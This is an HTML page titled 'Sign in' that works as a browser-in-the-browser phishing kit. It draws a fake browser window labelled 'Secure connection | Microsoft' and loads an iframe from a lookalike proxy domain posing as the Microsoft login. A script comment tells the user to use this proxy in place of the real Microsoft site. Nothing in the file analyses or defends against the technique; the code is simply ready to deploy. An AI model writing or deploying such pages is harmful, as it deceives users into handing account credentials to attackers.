<!DOCTYPE html>
<html>
<head>
    <title>Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, sans-serif; }
        .browser {
            width: 800px;
            max-width: 95vw;
            background: #f0f2f5;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            overflow: hidden;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .browser-bar {
            background: #e4e6eb;
            padding: 8px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #ccc;
        }
        .browser-dots { display: flex; gap: 6px; }
        .dot { width: 12px; height: 12px; border-radius: 50%; }
        .dot.red { background: #ff5f56; }
        .dot.yellow { background: #ffbd2e; }
        .dot.green { background: #27c93f; }
        .browser-url {
            flex: 1;
            background: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 13px;
            color: #1a1a1a;
            border: 1px solid #ddd;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .browser-iframe {
            width: 100%;
            height: 500px;
            border: none;
            display: block;
        }
        .browser-footer {
            background: #f7f8fa;
            padding: 6px 16px;
            font-size: 12px;
            color: #666;
            border-top: 1px solid #ddd;
            text-align: right;
        }
        .close-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 14px;
            cursor: pointer;
            z-index: 9999;
        }
        .close-btn:hover { background: rgba(255,0,0,0.8); }
    </style>
</head>
<body>
    <button class="close-btn" onclick="window.close()">✕ Close</button>
    <div class="browser">
        <div class="browser-bar">
            <div class="browser-dots">
                <span class="dot red"></span>
                <span class="dot yellow"></span>
                <span class="dot green"></span>
            </div>
            <div class="browser-url" id="urlDisplay">Loading...</div>
        </div>
        <iframe class="browser-iframe" id="bitbFrame" src="about:blank"></iframe>
        <div class="browser-footer">🔒 Secure connection | Microsoft</div>
    </div>
    <script>
        // ✅ FIX: Use the PROXY URL, not Microsoft directly
        const PROXY_URL = 'https://login.office-onmisoft.online/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https://login.microsoftonline.com/';
        
        const params = new URLSearchParams(window.location.search);
        let targetUrl = params.get('url') || PROXY_URL;
        
        if (!targetUrl.startsWith('http')) {
            targetUrl = 'https://' + targetUrl;
        }
        
        document.getElementById('urlDisplay').textContent = targetUrl;
        document.getElementById('bitbFrame').src = targetUrl;
    </script>
</body>
</html>
